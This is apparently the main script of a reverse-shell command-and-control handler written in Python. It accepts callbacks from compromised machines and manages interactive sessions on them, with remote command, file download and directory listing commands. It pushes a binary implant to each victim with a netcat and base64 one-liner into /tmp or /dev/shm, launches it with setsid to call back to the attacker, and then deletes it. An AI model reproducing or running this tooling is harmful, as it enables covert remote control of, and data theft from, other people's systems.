#!python3

from modules.utils import send_file, chk_payload, local_shell
from modules.sysinfo import SystemInfoGatherer
from modules.nethelper import netshell_loop, pretty, listen, is_alive
from modules.shell import RawShell
from threading import Thread
from modules.commands import ls

import pip._vendor.rich
import logging
import socket
import json
import time
import sys
import cmd
import os


logging.basicConfig(level=logging.DEBUG)
sys.dont_write_bytecode = True
PROJ_DIR = os.path.dirname(os.path.realpath(__file__))
class Shell():
    def __init__(self, socket):
        self.socket = socket
        self.session_type = "bash"
        self.is_open = True
        self.is_loop = True
        self.is_bg = False

class NetShell(cmd.Cmd):
    def __init__(self, socket):
        super(NetShell, self).__init__()
        self.prompt = "net_shell > "
        self.socket = socket
        self.id = None
        self.output = None
        self.is_open = True
        self.is_loop = True
        self.is_bg = True
        self.shell_active = True

    def default(self, line):
        local_shell(line)

    def precmd(self, line):
        """Hook method executed just before the command line is
        interpreted, but after the input prompt is generated and issued.
        """
        if not self.is_open:
            raise BrokenPipeError
        return line

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished."""

        return stop

    """
        <--CMD library ends here-->
    """

    """
        <--Commands start here-->
    """

    def do_ls(self, line):
        data = pretty(self.socket.send_command(f"ls {line}"))
        ls(json.loads(data))
    
    def do_send(self, line): # DOES NOT WORK
        check = self.socket.send_command(f"sendingfile {line}")
        if b"ready" in check:
            with open(line, 'rb') as f:
                while (chunk := f.read(1024)):
                    self.socket.client_socket.send(chunk)

    def do_get(self, line):
        contents = pretty(self.socket.send_command(f"gettingfile {line}"))
        if contents:
            with open(line.split("/")[-1], 'w') as f:
                f.write(f"{contents}\n")

    def do_run(self, line):
        self.output = pretty(self.socket.send_command(line))
        if self.output:
            sys.stdout.write(f"{self.output}\n")

    def do_cd(self, line):
        self.output = pretty(self.socket.send_command(f"cd {line}"))
        if self.output:
            sys.stdout.write(f"{self.output}\n")

    def do_exit(self, line):
        logging.info(f"Closing connection from session {self.id +1}")

        self.is_loop = False
        self.socket.client_socket.close()
        self.socket.server_socket.close()
        return True

class LocalShell(cmd.Cmd):
    def __init__(self):
        super(LocalShell, self).__init__()
        self.prompt = "local_shell > "
        self.sessions = []
        self.current_session = None
        if len(sys.argv) > 1 and sys.argv[1] == "-l":
            self.do_listen(None)

        if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
            logging.warning('Warning: Binary file "payload" is not present.')
            chk_payload(PROJ_DIR)

    def default(self, line):
        local_shell(line)

    def emptyline(self):
        """Called when an empty line is entered in response to the prompt.

        If this method is not overridden, it repeats the last nonempty
        command entered.
        """
        return None

    def postcmd(self, stop, line):
        """Hook method executed just after a command dispatch is finished.
        """

        return stop

    """
        <--Commands start here-->
    """

    def do_compile(self, line):
        chk_payload(PROJ_DIR)

    def do_listen(self, line):
        host, port = ("0.0.0.0", 4242)
        raw_shell = False

        if line == "--raw":
            raw_shell = True
        else:
            args = line.strip().split(" ")
            if not line:
                pass
            elif len(args) < 2:
                print("Error: Invalid input. Please enter in the format 'host port [optional_arg]'.")
                return
            elif len(args) == 2:
                host, port = args
            else:
                if args[2] != "--raw":
                    logging.error(f"error: unknown param {args[2]}")
                    return
                host, port, raw_shell = args[:3]

            try:
                port = int(port)
            except ValueError:
                print("Error: Invalid input. Port should be a number.")
                return

        sock = listen(host, port, 0)
        if not sock: return
        sock.sysinfo = SystemInfoGatherer()
        # sock.sysinfo.binaryGatherer(sock)

        # TODO: Make it so that if there 
        sock.sysinfo.is_nc = pretty(sock.send_command("which nc"))
        if not raw_shell:
            try:
                logging.info(f"Sending payload")

                test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
                send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
                time.sleep(1)
                # test = pretty(sock.send_command("./payload --test"))
                # print(test)

                # if not test == "Hello world!":
                #     logging.error("Thing did not run")
                #     raise Exception
                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
                sock.server_socket.close()
                sock.client_socket.close()
                logging.debug(f"Payload sent. Starting listener")

                sock = listen(host, port, 1)
                if not sock: return
                sock.send_command("rm -rf payload")

                self.current_session = NetShell(sock)
                self.current_session.session_type = "python"
            except Exception as e:
                logging.error(f"Fail to initialize payload. {e}")
                self.current_session = Shell(sock)
        else:
            self.current_session = Shell(sock)

        self.sessions.append(self.current_session)
        self.current_session.id = (len(self.sessions) - 1)
        logging.info(f"Session {self.current_session.id + 1} created")
        if self.current_session.session_type == "python":
            self.current_session.is_bg = True
            Thread(target=is_alive, args=[self.current_session]).start()
            netshell_loop(self.current_session)
        elif self.current_session.session_type == "bash":
            RawShell(self.current_session).run()
            self.current_session.is_bg = True
            Thread(target=is_alive, args=[self.current_session]).start()

    def do_sessions(self, line):
        args = line.split(" ")
        if args and "-i" in args[0]:
            try:
                index = int(args[1])
            except ValueError:
                logging.error("Index must be int")
                return
            if index:
                if index > len(self.sessions):
                    logging.error("Sesssion not found")
                    return
            session = self.sessions[index -1]
            if session.session_type == "python":
                session.is_bg = False
                netshell_loop(self.sessions[index -1])
                # session.is_bg = True
                # Thread(target=is_alive, args=[session.socket]).start()
            elif session.session_type == "bash":
                session.is_bg = False
                RawShell(session).run()
                session.is_bg = True
                Thread(target=is_alive, args=[session]).start()
                
            return

        for shell in self.sessions:
            # TODO: Format this
            if shell.session_type == "python":
                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
                                f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
            elif shell.session_type == "bash":
                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.client_address[0]} "
                                f"| Port {shell.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")

        sys.stdout.write("\n")

    def do_exit(self, line):
        logging.info("Exiting...")

        for netShell in self.sessions:
            if netShell.is_open:
                netShell.is_loop = False
                netShell.server.client_socket.close()
                netShell.server.server_socket.close()

        sys.exit()


def _local_loop(localShell):
    try:
        localShell.cmdloop()
    except KeyboardInterrupt:
        print("")
        _local_loop(localShell)

def main():
    _local_loop(LocalShell())


if __name__ == "__main__":
    main()
